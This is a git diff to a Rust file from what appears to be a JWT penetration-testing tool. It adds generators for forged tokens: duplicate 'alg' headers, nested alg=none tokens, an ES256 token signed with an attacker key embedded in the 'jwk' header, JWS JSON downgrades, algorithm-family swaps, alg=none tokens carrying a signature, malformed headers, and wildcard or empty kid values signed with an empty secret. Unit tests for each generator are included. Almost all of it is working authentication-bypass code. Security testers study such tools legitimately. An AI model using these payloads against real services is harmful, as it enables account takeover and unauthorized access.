@@ -697,6 +697,382 @@ pub fn generate_kid_predictable_payload(
     Ok(payloads)
 }
 
+/// Generate headers with duplicate JSON keys.
+///
+/// JSON parsers diverge on duplicate keys (some take first, some take last,
+/// some error). Two stacks side-by-side — `{"alg":"none","alg":"HS256"}` —
+/// let an attacker pick whichever interpretation the verifier disagrees with
+/// (e.g. server reads first → `none`, but signature check skipped). Headers
+/// are built as raw JSON so serde's dedup doesn't collapse them.
+pub fn generate_duplicate_key_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    let raw_headers: &[&str] = &[
+        r#"{"alg":"none","typ":"JWT","alg":"HS256"}"#,
+        r#"{"alg":"HS256","typ":"JWT","alg":"none"}"#,
+        r#"{"alg":"none","alg":"HS256","typ":"JWT"}"#,
+        r#"{"alg":"HS256","typ":"JWT","typ":"JOSE"}"#,
+        r#"{"typ":"JWT","alg":"HS256","kid":"a","kid":"b"}"#,
+    ];
+
+    let mut payloads = Vec::with_capacity(raw_headers.len() * 2);
+    for raw in raw_headers {
+        let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(raw.as_bytes());
+        // Unsigned (probes parse-then-skip behavior)
+        payloads.push(format!("{header_b64}.{claims_part}"));
+        // HS256-signed with empty secret (probes "verify with fallback key" behavior)
+        let signing = format!("{header_b64}.{claims_part}");
+        payloads.push(sign_hs256(&signing, b""));
+    }
+    info!("Generated duplicate-JSON-key header payloads");
+    Ok(payloads)
+}
+
+/// Generate nested JWT payloads (`cty: JWT`).
+///
+/// RFC 7519 §11.2: when the outer header sets `cty=JWT`, the payload is itself
+/// an encoded JWT. Servers that recursively unpack but verify only one layer
+/// can be tricked into honouring an inner `alg: none` token. Emits three
+/// outer/inner combinations.
+pub fn generate_nested_jwt_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    // Inner JWT carrying the original claims, with alg=none and no signature.
+    let inner_header_none = json!({ "alg": "none", "typ": "JWT" });
+    let inner_header_b64 = general_purpose::URL_SAFE_NO_PAD
+        .encode(serde_json::to_string(&inner_header_none)?.as_bytes());
+    let inner_none = format!("{inner_header_b64}.{claims_part}.");
+
+    // Inner HS256-signed with empty secret, in case the server fast-paths cty=JWT.
+    let inner_header_hs = json!({ "alg": "HS256", "typ": "JWT" });
+    let inner_hs_input = build_signing_input(&inner_header_hs, claims_part)?;
+    let inner_hs = sign_hs256(&inner_hs_input, b"");
+
+    let mut payloads = Vec::new();
+
+    // Outer alg=none + cty=JWT + inner alg=none
+    {
+        let outer = json!({ "alg": "none", "typ": "JWT", "cty": "JWT" });
+        let claims_b64 = general_purpose::URL_SAFE_NO_PAD.encode(inner_none.as_bytes());
+        let header_b64 =
+            general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&outer)?.as_bytes());
+        payloads.push(format!("{header_b64}.{claims_b64}."));
+    }
+
+    // Outer HS256 (empty secret) + cty=JWT + inner alg=none
+    {
+        let outer = json!({ "alg": "HS256", "typ": "JWT", "cty": "JWT" });
+        let claims_b64 = general_purpose::URL_SAFE_NO_PAD.encode(inner_none.as_bytes());
+        let header_b64 =
+            general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&outer)?.as_bytes());
+        let signing = format!("{header_b64}.{claims_b64}");
+        payloads.push(sign_hs256(&signing, b""));
+    }
+
+    // Outer HS256 + cty=JWT + inner HS256 (empty secret)
+    {
+        let outer = json!({ "alg": "HS256", "typ": "JWT", "cty": "JWT" });
+        let claims_b64 = general_purpose::URL_SAFE_NO_PAD.encode(inner_hs.as_bytes());
+        let header_b64 =
+            general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&outer)?.as_bytes());
+        let signing = format!("{header_b64}.{claims_b64}");
+        payloads.push(sign_hs256(&signing, b""));
+    }
+
+    info!("Generated nested JWT (cty=JWT) payloads");
+    Ok(payloads)
+}
+
+/// Generate an ES256 token with an EC public key embedded in the `jwk` header.
+///
+/// Mirrors [`generate_jwk_embed_payload`] but for ECDSA P-256. Libraries that
+/// derive the verification key from the embedded `jwk` will validate it.
+pub fn generate_jwk_embed_ec_payload(token: &str) -> Result<String> {
+    use openssl::bn::{BigNum, BigNumContext};
+    use openssl::ec::{EcGroup, EcKey};
+    use openssl::nid::Nid;
+    use openssl::pkey::PKey;
+
+    let claims_part = extract_claims_part(token)?;
+
+    let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1)
+        .map_err(|e| anyhow::anyhow!("EC group: {e}"))?;
+    let ec = EcKey::generate(&group).map_err(|e| anyhow::anyhow!("EC gen: {e}"))?;
+    let pkey = PKey::from_ec_key(ec.clone()).map_err(|e| anyhow::anyhow!("EC pkey: {e}"))?;
+
+    let mut ctx = BigNumContext::new()?;
+    let mut x = BigNum::new()?;
+    let mut y = BigNum::new()?;
+    ec.public_key()
+        .affine_coordinates(&group, &mut x, &mut y, &mut ctx)
+        .map_err(|e| anyhow::anyhow!("EC coords: {e}"))?;
+
+    // P-256 coords are exactly 32 bytes — left-pad if BigNum trims leading zeros.
+    fn pad32(bytes: Vec<u8>) -> Vec<u8> {
+        if bytes.len() >= 32 {
+            bytes
+        } else {
+            let mut out = vec![0u8; 32 - bytes.len()];
+            out.extend_from_slice(&bytes);
+            out
+        }
+    }
+    let x_b64 = general_purpose::URL_SAFE_NO_PAD.encode(pad32(x.to_vec()));
+    let y_b64 = general_purpose::URL_SAFE_NO_PAD.encode(pad32(y.to_vec()));
+
+    let kid = "jwt-hack-injected-ec";
+    let jwk = json!({
+        "kty": "EC",
+        "crv": "P-256",
+        "use": "sig",
+        "alg": "ES256",
+        "kid": kid,
+        "x": x_b64,
+        "y": y_b64,
+    });
+
+    let header = json!({
+        "alg": "ES256",
+        "typ": "JWT",
+        "kid": kid,
+        "jwk": jwk,
+    });
+
+    let input = build_signing_input(&header, claims_part)?;
+    let pem = pkey
+        .private_key_to_pem_pkcs8()
+        .map_err(|e| anyhow::anyhow!("export EC private key: {e}"))?;
+    let key = jsonwebtoken::EncodingKey::from_ec_pem(&pem)?;
+    let sig_b64 =
+        jsonwebtoken::crypto::sign(input.as_bytes(), &key, jsonwebtoken::Algorithm::ES256)?;
+
+    info!("Generated EC jwk-embedded ES256 payload (signed with embedded key)");
+    Ok(format!("{input}.{sig_b64}"))
+}
+
+/// Emit the token in **JWS Flattened JSON Serialization** form.
+///
+/// RFC 7515 §7.2.2 defines `{"protected":..., "payload":..., "signature":...}`
+/// as an alternative to the compact `h.p.s` encoding. Servers that auto-detect
+/// based on first byte may parse this without applying compact-form-only
+/// validation paths. Two variants: passthrough of the original parts, and a
+/// downgrade where `protected` carries `alg: none` (signature kept as the
+/// original bytes, which a `none`-honouring lib will not actually verify).
+pub fn generate_jws_json_payload(token: &str) -> Result<Vec<String>> {
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+    let original_header = parts[0];
+    let claims_part = parts[1];
+    let original_sig = parts.get(2).copied().unwrap_or("");
+
+    let mut payloads = Vec::new();
+
+    // Passthrough — same parts, JSON-wrapped.
+    payloads.push(
+        serde_json::to_string(&json!({
+            "protected": original_header,
+            "payload": claims_part,
+            "signature": original_sig,
+        }))
+        .unwrap(),
+    );
+
+    // alg=none downgrade with original signature retained verbatim.
+    let none_header = json!({ "alg": "none", "typ": "JWT" });
+    let none_b64 = general_purpose::URL_SAFE_NO_PAD
+        .encode(serde_json::to_string(&none_header).unwrap().as_bytes());
+    payloads.push(
+        serde_json::to_string(&json!({
+            "protected": none_b64,
+            "payload": claims_part,
+            "signature": original_sig,
+        }))
+        .unwrap(),
+    );
+
+    // General serialization variant with an unprotected header carrying alg=none.
+    payloads.push(
+        serde_json::to_string(&json!({
+            "protected": original_header,
+            "header": { "alg": "none" },
+            "payload": claims_part,
+            "signature": original_sig,
+        }))
+        .unwrap(),
+    );
+
+    info!("Generated JWS Flattened JSON serialization payloads");
+    Ok(payloads)
+}
+
+/// Generate PS↔RS cross-family `alg` swaps that preserve the original signature.
+///
+/// Libraries that pick a verifier from `alg` but accept any RSA key shape may
+/// be tricked into running an RSASSA-PKCS1-v1_5 signature through an RSASSA-PSS
+/// verifier (or vice versa). The original token's signature is retained — the
+/// server's verifier choice is the side under test.
+pub fn generate_alg_family_swap_payload(token: &str) -> Result<Vec<String>> {
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+    let claims_part = parts[1];
+    let original_sig = parts.get(2).copied().unwrap_or("");
+    let source_alg = original_alg(token).unwrap_or_else(|| "RS256".to_string());
+
+    // (target alg) variants depending on source family.
+    let targets: &[&str] = match source_alg.to_uppercase().as_str() {
+        "RS256" => &["PS256", "RS384", "RS512", "PS384"],
+        "RS384" => &["PS384", "RS256", "RS512", "PS256"],
+        "RS512" => &["PS512", "RS256", "RS384", "PS256"],
+        "PS256" => &["RS256", "PS384", "PS512", "RS384"],
+        "PS384" => &["RS384", "PS256", "PS512", "RS256"],
+        "PS512" => &["RS512", "PS256", "PS384", "RS256"],
+        "ES256" => &["ES384", "ES512", "ES256K"],
+        "ES384" => &["ES256", "ES512", "ES256K"],
+        "ES512" => &["ES256", "ES384", "ES256K"],
+        // For HMAC sources, swap within HMAC family — useful for hash-size confusion.
+        "HS256" => &["HS384", "HS512"],
+        "HS384" => &["HS256", "HS512"],
+        "HS512" => &["HS256", "HS384"],
+        _ => &["RS256", "PS256"],
+    };
+
+    let mut payloads = Vec::with_capacity(targets.len());
+    for &target in targets {
+        let header = json!({ "alg": target, "typ": "JWT" });
+        let header_b64 = general_purpose::URL_SAFE_NO_PAD
+            .encode(serde_json::to_string(&header).unwrap().as_bytes());
+        payloads.push(format!("{header_b64}.{claims_part}.{original_sig}"));
+    }
+    info!(
+        "Generated cross-family alg-swap payloads ({} -> {} variants)",
+        source_alg,
+        targets.len()
+    );
+    Ok(payloads)
+}
+
+/// Generate `alg: none` tokens that still carry a non-empty signature segment.
+///
+/// Some libraries treat `alg=none` as "skip verification" but still require a
+/// non-empty third segment as a sanity check. Provides a few flavours of
+/// signature bytes so callers can probe each branch.
+pub fn generate_none_with_sig_payload(token: &str) -> Result<Vec<String>> {
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+    let claims_part = parts[1];
+    let original_sig = parts.get(2).copied().unwrap_or("");
+
+    let mut payloads = Vec::new();
+    for alg in ["none", "NONE", "None", "nOnE"] {
+        let header = json!({ "alg": alg, "typ": "JWT" });
+        let header_b64 = general_purpose::URL_SAFE_NO_PAD
+            .encode(serde_json::to_string(&header).unwrap().as_bytes());
+        // Retained original signature — works against libs that read alg=none
+        // but require a non-empty sig.
+        if !original_sig.is_empty() {
+            payloads.push(format!("{header_b64}.{claims_part}.{original_sig}"));
+        }
+        // Fake but well-formed base64url signatures.
+        payloads.push(format!("{header_b64}.{claims_part}.AAAA"));
+        payloads.push(format!("{header_b64}.{claims_part}.aGVsbG8td29ybGQ"));
+    }
+    info!("Generated alg=none + non-empty signature payloads");
+    Ok(payloads)
+}
+
+/// Generate header-shape quirks: UTF-8 BOM, leading/trailing whitespace inside
+/// the raw JSON header, and tokens with a 4th trailing-garbage segment.
+///
+/// Probes parsers that tolerate non-strict JSON or split tokens on first/last
+/// `.` instead of validating a 3-segment shape.
+pub fn generate_header_quirks_payload(token: &str) -> Result<Vec<String>> {
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+    let claims_part = parts[1];
+    let original_sig = parts.get(2).copied().unwrap_or("");
+
+    // Raw headers with non-strict prefixes/suffixes.
+    let raw_variants: &[&[u8]] = &[
+        // UTF-8 BOM before JSON.
+        b"\xef\xbb\xbf{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
+        // Leading whitespace / newlines.
+        b"   {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
+        b"\n{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
+        b"\t{\"alg\":\"none\",\"typ\":\"JWT\"}",
+        // Trailing whitespace / newline.
+        b"{\"alg\":\"HS256\",\"typ\":\"JWT\"}\n",
+        b"{\"alg\":\"HS256\",\"typ\":\"JWT\"}   ",
+        // BOM + alg=none combo.
+        b"\xef\xbb\xbf{\"alg\":\"none\",\"typ\":\"JWT\"}",
+    ];
+
+    let mut payloads = Vec::new();
+    for raw in raw_variants {
+        let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(raw);
+        // Unsigned (header.payload) — parser quirk surface.
+        payloads.push(format!("{header_b64}.{claims_part}"));
+        // HS256-signed with empty secret.
+        let signing = format!("{header_b64}.{claims_part}");
+        payloads.push(sign_hs256(&signing, b""));
+    }
+
+    // 4th-segment trailing garbage on the original token.
+    let original_header = parts[0];
+    if !original_sig.is_empty() {
+        payloads.push(format!(
+            "{original_header}.{claims_part}.{original_sig}.garbage"
+        ));
+        payloads.push(format!(
+            "{original_header}.{claims_part}.{original_sig}.{original_sig}"
+        ));
+    } else {
+        payloads.push(format!("{original_header}.{claims_part}..junk"));
+    }
+
+    info!("Generated header BOM/whitespace + trailing-garbage payloads");
+    Ok(payloads)
+}
+
+/// Generate `kid` payloads with empty / null / wildcard / fallback names.
+///
+/// JWKS resolvers that fall back to a default key when `kid` is missing,
+/// blank, or non-matching can be tricked into validating with a key that
+/// the attacker controls. Each variant is HS256-signed with an empty secret.
+pub fn generate_kid_wildcard_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    // Headers with kid set to special values, plus a header that omits kid entirely.
+    let kid_variants: Vec<serde_json::Value> = vec![
+        json!({ "alg": "HS256", "typ": "JWT", "kid": "" }),
+        json!({ "alg": "HS256", "typ": "JWT", "kid": serde_json::Value::Null }),
+        json!({ "alg": "HS256", "typ": "JWT", "kid": "*" }),
+        json!({ "alg": "HS256", "typ": "JWT", "kid": "default" }),
+        json!({ "alg": "HS256", "typ": "JWT", "kid": "0" }),
+        json!({ "alg": "HS256", "typ": "JWT", "kid": "1" }),
+        // kid as wrong types — some parsers coerce.
+        json!({ "alg": "HS256", "typ": "JWT", "kid": 0 }),
+        json!({ "alg": "HS256", "typ": "JWT", "kid": ["a", "b"] }),
+        // No kid at all — JWKS may fall back to a single configured key.
+        json!({ "alg": "HS256", "typ": "JWT" }),
+    ];
+
+    let mut payloads = Vec::with_capacity(kid_variants.len());
+    for header in kid_variants {
+        let input = build_signing_input(&header, claims_part)?;
+        payloads.push(sign_hs256(&input, b""));
+    }
+    info!("Generated kid empty/null/wildcard fallback payloads");
+    Ok(payloads)
+}
+
 /// Generate all available payloads for a token
 pub fn generate_all_payloads(
     token: &str,
@@ -823,6 +1199,46 @@ pub fn generate_all_payloads(
     // kid predictable-path payloads (empty secret; CLI may pass bytes later)
     if should_generate_all || targets.contains("kid_predictable") {
         payloads.extend(generate_kid_predictable_payload(token, None)?);
+    }
+
+    // Duplicate-JSON-key headers
+    if should_generate_all || targets.contains("dup_key") {
+        payloads.extend(generate_duplicate_key_payload(token)?);
+    }
+
+    // Nested JWT (cty=JWT)
+    if should_generate_all || targets.contains("nested") {
+        payloads.extend(generate_nested_jwt_payload(token)?);
+    }
+
+    // EC variant of jwk-embed (real, signed attack)
+    if should_generate_all || targets.contains("jwk_embed_ec") {
+        payloads.push(generate_jwk_embed_ec_payload(token)?);
+    }
+
+    // JWS Flattened JSON serialization
+    if should_generate_all || targets.contains("jws_json") {
+        payloads.extend(generate_jws_json_payload(token)?);
+    }
+
+    // PS↔RS cross-family alg swaps (preserves original signature)
+    if should_generate_all || targets.contains("alg_family_swap") {
+        payloads.extend(generate_alg_family_swap_payload(token)?);
+    }
+
+    // alg=none retaining a non-empty signature segment
+    if should_generate_all || targets.contains("none_sig") {
+        payloads.extend(generate_none_with_sig_payload(token)?);
+    }
+
+    // BOM / whitespace / trailing-garbage parser quirks
+    if should_generate_all || targets.contains("header_quirks") {
+        payloads.extend(generate_header_quirks_payload(token)?);
+    }
+
+    // kid empty/null/wildcard fallback
+    if should_generate_all || targets.contains("kid_wildcard") {
+        payloads.extend(generate_kid_wildcard_payload(token)?);
     }
 
     Ok(payloads)
@@ -1504,6 +1920,168 @@ mod tests {
             assert_eq!(parts.len(), 3);
             let input = format!("{}.{}", parts[0], parts[1]);
             let expected = hmac_sha256::HMAC::mac(input.as_bytes(), secret);
+            let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
+            assert_eq!(parts[2], expected_b64);
+        }
+    }
+
+    #[test]
+    fn test_generate_duplicate_key_payload_has_two_alg_in_raw_header() {
+        let payloads = generate_duplicate_key_payload(DUMMY_TOKEN).expect("dup ok");
+        assert!(!payloads.is_empty());
+        let mut saw_dup_alg = false;
+        for p in &payloads {
+            let header_b64 = p.split('.').next().unwrap();
+            let raw = URL_SAFE_NO_PAD.decode(header_b64).unwrap();
+            let raw_str = String::from_utf8_lossy(&raw);
+            let alg_occurrences = raw_str.matches("\"alg\"").count();
+            if alg_occurrences >= 2 {
+                saw_dup_alg = true;
+                break;
+            }
+        }
+        assert!(
+            saw_dup_alg,
+            "expected at least one header with duplicate alg keys"
+        );
+    }
+
+    #[test]
+    fn test_generate_nested_jwt_payload_inner_is_jwt() {
+        let payloads = generate_nested_jwt_payload(DUMMY_TOKEN).expect("nested ok");
+        assert!(!payloads.is_empty());
+        for p in &payloads {
+            let parts: Vec<&str> = p.split('.').collect();
+            assert!(parts.len() >= 2);
+            let header = get_header_from_token(p).unwrap();
+            assert_eq!(header.get("cty").and_then(|v| v.as_str()), Some("JWT"));
+            // The claims segment, when base64url-decoded, must itself be a JWT-shaped string.
+            let inner = URL_SAFE_NO_PAD.decode(parts[1]).unwrap();
+            let inner_str = String::from_utf8(inner).unwrap();
+            assert!(
+                inner_str.split('.').count() >= 2,
+                "inner payload must look like a JWT, got {inner_str}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_generate_jwk_embed_ec_payload_signature_verifies() {
+        use jsonwebtoken::{Algorithm, DecodingKey, Validation};
+        let token = generate_jwk_embed_ec_payload(DUMMY_TOKEN).expect("ec embed ok");
+        let parts: Vec<&str> = token.split('.').collect();
+        assert_eq!(parts.len(), 3);
+
+        let header = get_header_from_token(&token).expect("header");
+        let jwk = header.get("jwk").expect("jwk present");
+        assert_eq!(jwk.get("kty").and_then(|v| v.as_str()), Some("EC"));
+        assert_eq!(jwk.get("crv").and_then(|v| v.as_str()), Some("P-256"));
+        let x_b64 = jwk.get("x").unwrap().as_str().unwrap();
+        let y_b64 = jwk.get("y").unwrap().as_str().unwrap();
+
+        // Reconstruct DecodingKey from x/y components via jsonwebtoken's helper.
+        let key = DecodingKey::from_ec_components(x_b64, y_b64).unwrap();
+        let mut v = Validation::new(Algorithm::ES256);
+        v.validate_exp = false;
+        v.required_spec_claims.clear();
+        let res = jsonwebtoken::decode::<serde_json::Value>(&token, &key, &v);
+        assert!(
+            res.is_ok(),
+            "ES256 signature should verify: {:?}",
+            res.err()
+        );
+    }
+
+    #[test]
+    fn test_generate_jws_json_payload_is_valid_json_with_required_fields() {
+        let payloads = generate_jws_json_payload(DUMMY_TOKEN).expect("json ok");
+        assert!(payloads.len() >= 2);
+        for p in &payloads {
+            let v: Value = serde_json::from_str(p).expect("must be valid JSON");
+            let obj = v.as_object().expect("must be JSON object");
+            assert!(obj.contains_key("protected"));
+            assert!(obj.contains_key("payload"));
+            assert!(obj.contains_key("signature"));
+        }
+    }
+
+    #[test]
+    fn test_generate_alg_family_swap_payload_keeps_signature() {
+        let payloads = generate_alg_family_swap_payload(DUMMY_TOKEN).expect("swap ok");
+        assert!(!payloads.is_empty());
+        let original_sig = DUMMY_TOKEN.split('.').nth(2).unwrap();
+        for p in &payloads {
+            let sig = p.split('.').nth(2).unwrap();
+            assert_eq!(sig, original_sig, "signature must be retained across swaps");
+        }
+        // Source HS256 → variants should still be HMAC family.
+        let algs: Vec<String> = payloads
+            .iter()
+            .filter_map(|p| {
+                get_header_from_token(p)
+                    .and_then(|h| h.get("alg").and_then(|v| v.as_str().map(String::from)))
+            })
+            .collect();
+        assert!(algs.iter().any(|a| a == "HS384" || a == "HS512"));
+    }
+
+    #[test]
+    fn test_generate_none_with_sig_payload_has_none_alg_and_nonempty_sig() {
+        let payloads = generate_none_with_sig_payload(DUMMY_TOKEN).expect("none sig ok");
+        assert!(!payloads.is_empty());
+        for p in &payloads {
+            let parts: Vec<&str> = p.split('.').collect();
+            assert_eq!(parts.len(), 3);
+            assert!(!parts[2].is_empty(), "signature segment must be non-empty");
+            let alg = get_header_from_token(p)
+                .and_then(|h| h.get("alg").and_then(|v| v.as_str().map(String::from)))
+                .unwrap();
+            assert!(
+                alg.to_lowercase() == "none",
+                "alg must be a 'none' variant, got {alg}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_generate_header_quirks_payload_has_bom_and_trailing_segment() {
+        let payloads = generate_header_quirks_payload(DUMMY_TOKEN).expect("quirks ok");
+        assert!(!payloads.is_empty());
+
+        // At least one header decodes to bytes starting with UTF-8 BOM.
+        let any_bom = payloads.iter().any(|p| {
+            let h_b64 = p.split('.').next().unwrap();
+            let raw = URL_SAFE_NO_PAD.decode(h_b64).unwrap_or_default();
+            raw.starts_with(b"\xef\xbb\xbf")
+        });
+        assert!(any_bom, "expected at least one BOM-prefixed header");
+
+        // At least one variant has a 4th segment.
+        assert!(payloads.iter().any(|p| p.split('.').count() == 4));
+    }
+
+    #[test]
+    fn test_generate_kid_wildcard_payload_includes_special_kids() {
+        let payloads = generate_kid_wildcard_payload(DUMMY_TOKEN).expect("kid wc ok");
+        assert!(!payloads.is_empty());
+
+        let mut seen = std::collections::HashSet::new();
+        for p in &payloads {
+            if let Some(h) = get_header_from_token(p) {
+                if let Some(kid) = h.get("kid") {
+                    seen.insert(kid.clone());
+                }
+            }
+        }
+        assert!(seen.contains(&serde_json::Value::String(String::new())));
+        assert!(seen.contains(&serde_json::Value::String("*".to_string())));
+        assert!(seen.contains(&serde_json::Value::Null));
+        // Every signed payload must HS256-verify against empty secret.
+        for p in &payloads {
+            let parts: Vec<&str> = p.split('.').collect();
+            assert_eq!(parts.len(), 3);
+            let input = format!("{}.{}", parts[0], parts[1]);
+            let expected = hmac_sha256::HMAC::mac(input.as_bytes(), b"");
             let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
             assert_eq!(parts[2], expected_b64);
         }
